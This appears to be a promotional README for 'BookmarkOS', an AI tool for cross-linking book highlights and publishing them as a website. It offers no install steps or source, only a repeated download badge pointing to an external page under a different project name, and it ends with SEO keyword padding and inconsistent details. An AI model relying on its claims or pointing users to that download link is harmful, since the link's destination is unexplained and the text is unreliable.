# BookmarkOS: The Autonomous Personal Library Engine

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://ditakebede1.github.io/personal-knowledge-nexus/)

**Transform every book you read into a living, breathing digital entity that evolves with your thinking.** BookmarkOS is not a library manager; it is a knowledge synthesis engine that captures the intellectual DNA of each book you read and weaves it into a permanent, queryable, and publishable web presence. While Library-OS focuses on static archiving, BookmarkOS treats each book as a living organism—constantly re-contextualized by subsequent reads, cross-linked by emergent themes, and automatically narrated by AI into new insights.

---

## The Philosophy: Books as Seeds, Not Artifacts

Most library systems treat books as dead objects on a shelf. BookmarkOS inverts this: your reading journey becomes a **knowledge forest**, where each book is a seed that grows roots into every other book you've read. When you highlight a passage in a 2024 book on behavioral economics, BookmarkOS automatically surfaces a contradictory passage from a 2022 philosophy text you forgot you owned. This is not organization; it is **intellectual alchemy**.

---

## Architecture Overview

```mermaid
graph LR
    A[Your Reading Device] --> B[BookmarkOS Capture CLI]
    B --> C[AI Entity Scanner]
    C --> D[Knowledge Graph Database]
    D --> E[Semantic Embedding Engine]
    E --> F[Theme Resolution Engine]
    F --> G[Cross-Book Insighter]
    G --> H[Publication API]
    H --> I[Your Website / Substack / Notion]
    
    style A fill:#f9f,stroke:#333,stroke-width:2px
    style I fill:#4a4,stroke:#333,stroke-width:4px
    style C fill:#e6e6fa,stroke:#333,stroke-width:2px
    style G fill:#ffd700,stroke:#333,stroke-width:2px
```

The system ingests raw book annotations, transforms them into AI-enriched entities, resolves contradictions and connections across your entire reading history, and publishes a live, ever-updating "second brain" on your personal domain.

---

## Example Profile Configuration

Create a `bookmarkos.profile.yml` file in your home directory:

```yaml
profile:
  name: "Alex Reader"
  website: "alexreads.xyz"
  theme: "minerva"
  language:
    primary: "en"
    secondary: "ja"
    translate: true

ai:
  default_model: "openai:gpt-4-turbo"
  fallback: "claude:claude-3-opus-20240229"
  embedding: "text-embedding-3-small"
  citation_style: "turabian"

publishing:
  format: "responsive-web"
  auto_annotate: true
  weekly_digest: true
  featured_connections: 5

ingestion:
  kindle: true
  kobo: true
  manual_highlight: true
  epaper: false
```

---

## Example Console Invocation

```bash
bookmarkos publish --profile alice_2026 --depth semantic --include connections --output webfolder

# Real-time output:
# [BookmarkOS] Scanning 142 books...
# [BookmarkOS] Found 1,847 highlight entities
# [BookmarkOS] Resolving 89 multi-book connections...
# [BookmarkOS] Publishing to alice-reads.xyz/synthesis/2026
# [BookmarkOS] Done. 14 new insights generated.
```

---

## Emoji OS Compatibility Table

| Operating System | Capture Support | Live Publish | AI Sync |
|-----------------|----------------|-------------|---------|
| 🍏 macOS 14+    | Full           | Native      | Tunnel  |
| 🪟 Windows 11   | Limited        | Full        | Native  |
| 🐧 Ubuntu 24.04 | CLI Only       | Full        | Docker  |
| 🍎 iOS 18       | Reader-Only    | View-only   | Cloud   |
| 🤖 Android 15   | Full           | Full        | Native  |

---

## Feature List

- **Autonomous Cross-Referencing Engine** - Every new highlight automatically searches your entire library for semantic matches, creating a "living citation network"
- **AI-Powered Contradiction Resolution** - When two books disagree, BookmarkOS generates a synthesized perspective (using OpenAI GPT-4 or Claude API) and flags it as a "tension point"
- **Multilingual Book-to-Web Publishing** - Automatically translates your highlights and annotations into your website's audience language
- **Responsive Web Theme Engine** - 12 mobile-optimized themes that adapt to any device, with dark mode, serif toggle, and dyslexia-friendly fonts
- **24/7 Knowledge Concierge** - CLI chatbot that answers questions using only your library as evidence, not the internet
- **Entity Extraction Pipeline** - Extracts people, places, concepts, and dates from your highlights and builds a knowledge graph
- **Weekly Insight Generator** - Every Sunday, BookmarkOS publishes a "Fresh Synthesis" article to your website connecting your most recent read with an older forgotten gem
- **Privacy Mode** - Encrypts sensitive annotations locally before uploading to publication

---

## OpenAI API and Claude API Integration

BookmarkOS supports both OpenAI and Claude as interchangeable AI backends for different tasks:

| Task | Recommended AI | Fallback AI |
|------|----------------|-------------|
| Contradiction detection | Claude 3 Opus | GPT-4 Turbo |
| Knowledge graph extraction | GPT-4o | Claude 3 Haiku |
| Summary generation | Claude 3 Sonnet | GPT-3.5 Turbo |
| Cross-language translation | GPT-4 Turbo | Claude 3 Opus |
| Entity disambiguation | GPT-4o | Claude 3 Sonnet |

To configure, set environment variables or add to your profile:

```bash
export BOOKMARKOS_OPENAI_KEY="sk-your-key"
export BOOKMARKOS_CLAUDE_KEY="sk-ant-your-key"
```

The system intelligently routes tasks based on latency, cost, and task complexity, ensuring optimal performance for your reading load.

---

## Key Features Deep Dive

### Responsive UI Publishing
Your personal book knowledge website is not a static blog. It behaves like a **responsive knowledge panel**—on desktop it shows three-column layouts with sidebar graphs; on mobile it collapses into a swipeable card interface. Each book page automatically generates a "sibling map" showing which other books share the most highlighted passages with it.

### Multilingual Support
Ingest books in 47 languages, publish in 12. If you read a Japanese Murakami novel and want your English-language website to include your annotations, BookmarkOS uses your chosen AI to translate while preserving the original text as a hover tooltip. The system understands that a direct translation of a poetic highlight loses meaning—it asks the AI to explain the cultural context instead.

### 24/7 Customer Support
Not for you—for your readers. When someone visits your published book intelligence site and asks a question in the embedded chat widget, BookmarkOS answers **entirely from your own library**, citing the exact books and highlights you have created. This runs 24/7 with no input from you, effectively making you "always available" as a knowledge source.

---

## Disclaimer

BookmarkOS is an open-source tool designed to augment personal intellectual life. It does **not** store or process copyrighted full-text books. The system captures only user-generated highlights, annotations, and metadata. Users are responsible for complying with the terms of service of any AI APIs (OpenAI, Claude) they connect. The authors assume no liability for how users choose to publish or share their synthesized knowledge. By using BookmarkOS, you affirm that your input data (highlights, book metadata) is either your own original work or used under fair use principles. The system is provided "as is" without warranty of any kind, express or implied.

---

## MIT License

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[Full MIT License Text](https://opensource.org/licenses/MIT)

---

## Quick Start Download

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://ditakebede1.github.io/personal-knowledge-nexus/)

*BookmarkOS v2026.3.1 — Autonomous Personal Library Engine*

**SEO Keywords:** personal knowledge management, book highlights database, AI reading companion, knowledge graph from books, automated book publishing, semantic library system, OpenAI book analysis, Claude book integration, responsive reading website, multilingual book intelligence.